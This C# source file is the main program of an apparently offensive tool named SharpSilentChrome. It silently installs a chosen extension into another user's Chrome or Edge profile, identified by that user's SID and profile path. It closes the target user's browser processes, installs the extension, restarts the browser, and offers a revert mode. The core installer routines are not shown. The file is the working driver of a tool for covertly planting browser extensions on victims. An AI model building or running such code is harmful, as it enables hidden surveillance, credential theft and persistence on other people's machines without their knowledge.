using System;
using System.IO;

namespace SharpSilentChrome
{
    class SharpSilentChrome
    {
        static void ShowUsage()
        {
            string usage = @"

Usage: SharpSilentChrome.exe install /browser:[chrome/msedge] /sid:<SID> /profilepath:<user_profile_path> /path:<extension_path>
Usage: SharpSilentChrome.exe revert /browser:[chrome/msedge] /sid:<SID> /profilepath:<user_profile_path>

Example: SharpSilentChrome.exe install /browser:chrome /sid:S-1-5-21-1234567890-1234567890-1234567890-1000 /profilepath:""C:\Users\john.doe"" /path:""C:\Users\Public\Downloads\extension""
Example: SharpSilentChrome.exe revert /browser:chrome /sid:S-1-5-21-1234567890-1234567890-1234567890-1000 /profilepath:""C:\Users\john.doe""

Path is CASE SENSITIVE

            ";
            Console.WriteLine(usage);
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                ShowUsage();
                return;
            }

            switch (args[0].ToLower())
            {
                case "install":
                    ExecuteInstall(args);
                    break;
                case "revert":
                    ExecuteRevert(args);
                    break;
                default:
                    ShowUsage();
                    break;
            }
        }

        static (string sid, string profilePath, string extensionPath, string browser) ParseInstallArgs(string[] args)
        {
            string sid = null, profilePath = null, extensionPath = null, browser = null;

            for (int i = 1; i < args.Length; i++)
            {
                var arg = args[i];
                if (arg.StartsWith("/sid:", StringComparison.OrdinalIgnoreCase))
                    sid = arg.Substring(5).Trim('"');
                else if (arg.StartsWith("/profilepath:", StringComparison.OrdinalIgnoreCase))
                    profilePath = arg.Substring(13).Trim('"');
                else if (arg.StartsWith("/path:", StringComparison.OrdinalIgnoreCase))
                    extensionPath = arg.Substring(6).Trim('"');
                else if (arg.StartsWith("/browser:", StringComparison.OrdinalIgnoreCase))
                    browser = arg.Substring(9).Trim('"').ToLower();
                else
                    continue;
            }

            return (sid, profilePath, extensionPath, browser);
        }

        static (string sid, string profilePath, string browser) ParseRevertArgs(string[] args)
        {
            string sid = null, profilePath = null, browser = null;

            for (int i = 1; i < args.Length; i++)
            {
                var arg = args[i];
                if (arg.StartsWith("/sid:", StringComparison.OrdinalIgnoreCase))
                    sid = arg.Substring(5).Trim('"');
                else if (arg.StartsWith("/profilepath:", StringComparison.OrdinalIgnoreCase))
                    profilePath = arg.Substring(13).Trim('"');
                else if (arg.StartsWith("/browser:", StringComparison.OrdinalIgnoreCase))
                    browser = arg.Substring(9).Trim('"').ToLower();
                else
                    continue;
            }

            return (sid, profilePath, browser);
        }

        static void ExecuteInstall(string[] args)
        {
            var (sid, profilePath, extensionPath, browser) = ParseInstallArgs(args);

            // Argument null and sanity check
            if (string.IsNullOrWhiteSpace(sid) || string.IsNullOrWhiteSpace(profilePath) || 
                string.IsNullOrWhiteSpace(extensionPath) || string.IsNullOrWhiteSpace(browser))
            {
                Console.WriteLine($"[-] Invalid or missing arguments.\n");
                ShowUsage();
                return;
            }
            if (!Directory.Exists(extensionPath) || !Directory.Exists(profilePath))
            {
                Utils.WriteLine($"[-] Path not found: {(!Directory.Exists(extensionPath) ? extensionPath : profilePath)}");
                return;
            }
            if (browser != "chrome" && browser != "msedge")
            {
                Utils.WriteLine($"[-] Browser not supported: {browser}");
                return;
            }

            // Print arguments 
            var extensionId = Utils.GetExtensionId(extensionPath);

            Utils.WriteLine($"[+] SID: {sid}");
            Utils.WriteLine($"[+] Profile Path: {profilePath}");
            Utils.WriteLine($"[+] Browser: {browser}");
            Utils.WriteLine($"[+] Extension Path: {extensionPath}");
            Utils.WriteLine($"[+] ExtID: {extensionId}");
            Utils.WriteLine("");


            // ========= Installing Extension =========
            
            // Create backup files first 
            ExtensionInstaller.CreateBackup(profilePath, browser);
            
            // Check if process is running 
            var IsProcRunning = ProcessUtils.IsProcessRunning(browser, sid, profilePath);
            Utils.WriteLine($"[+] Process Running: {IsProcRunning}");

            if (IsProcRunning)
            {
                // 1. Close process 
                ProcessUtils.CloseProcesses(browser, sid, profilePath);
                Utils.WriteLine($"[+] {browser} processes closed for target user");

                // 2. Install Extension 
                ExtensionInstaller.InstallExtension(sid, extensionPath, extensionId, profilePath, browser);

                // 3. Restart 
                var currentUser = Environment.UserName;
                if (!profilePath.ToLower().Contains(currentUser.ToLower()))
                {
                    Utils.WriteLine($"[+] Skipping browser restart - current user ({currentUser}) not found in profile path ({profilePath})");
                    Utils.WriteLine($"[+] Browser will need to be started manually by the target user");
                }
                else
                {
                    Utils.WriteLine($"[+] Restarting {browser}...");
                    var exePath = ProcessUtils.FindBrowserExecutablePath(browser);
                    var userDataDir = ProcessUtils.FindBrowserUserDataDir(profilePath, browser);
                    ProcessUtils.RestartBrowser(exePath, userDataDir);
                }
            }
            else
            {
                // Just install 
                ExtensionInstaller.InstallExtension(sid, extensionPath, extensionId, profilePath, browser); 
            }

            Utils.WriteLine("[+] Done");
        }

        static void ExecuteRevert(string[] args)
        {
            var (sid, profilePath, browser) = ParseRevertArgs(args);

            // Argument null and sanity check
            if (string.IsNullOrWhiteSpace(profilePath) || string.IsNullOrWhiteSpace(browser))
            {
                Console.WriteLine($"[-] Invalid or missing arguments for revert.\n");
                ShowUsage();
                return;
            }
            if (!Directory.Exists(profilePath))
            {
                Utils.WriteLine($"[-] Profile path not found: {profilePath}");
                return;
            }
            if (browser != "chrome" && browser != "msedge")
            {
                Utils.WriteLine($"[-] Browser not supported: {browser}");
                return;
            }

            Utils.WriteLine($"[+] Reverting {browser} for profile: {profilePath}");

            var IsProcRunning = ProcessUtils.IsProcessRunning(browser, sid, profilePath);
            Utils.WriteLine($"[+] Process Running: {IsProcRunning}");

            if (IsProcRunning)
            {
                // 1. Close process 
                ProcessUtils.CloseProcesses(browser, sid, profilePath);
                Utils.WriteLine($"[+] {browser} processes closed for target user");

                // 2. Revert the backup files
                ExtensionInstaller.RevertToBackup(profilePath, browser);
                Utils.WriteLine("[+] Revert completed");

                // 3. Restart 
                var currentUser = Environment.UserName;
                if (!profilePath.ToLower().Contains(currentUser.ToLower()))
                {
                    Utils.WriteLine($"[+] Skipping browser restart - current user ({currentUser}) not found in profile path ({profilePath})");
                    Utils.WriteLine($"[+] Browser will need to be started manually by the target user");
                }
                else
                {
                    Utils.WriteLine($"[+] Restarting {browser}...");
                    var exePath = ProcessUtils.FindBrowserExecutablePath(browser);
                    var userDataDir = ProcessUtils.FindBrowserUserDataDir(profilePath, browser);
                    ProcessUtils.RestartBrowser(exePath, userDataDir);
                }
            }
            else
            {
                // Just revert extension 
                ExtensionInstaller.RevertToBackup(profilePath, browser);
                Utils.WriteLine("[+] Revert completed");
            }

        }
    }
}
